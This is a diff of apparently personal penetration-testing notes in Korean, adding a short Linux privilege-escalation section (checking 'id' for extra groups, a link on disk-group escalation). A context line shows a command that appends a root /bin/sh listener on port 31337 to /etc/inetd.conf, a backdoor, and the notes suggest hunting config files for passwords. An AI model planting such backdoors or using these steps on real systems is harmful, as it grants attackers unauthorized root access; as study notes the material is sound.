@@ -14,3 +14,13 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 - config 파일을 먼저 find로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인
 
 - password reuse
+
+
+# linux privilege escalation
+```bash
+id
+# uid,gid,groups가 아닌 다른 id가 있으면 권한 상승이 되는지 확인
+```
+<img width="620" height="47" alt="image" src="https://github.com/user-attachments/assets/385e64d5-6119-4bde-9fb4-f6c631746f3b" />
+
+- https://www.hackingarticles.in/disk-group-privilege-escalation
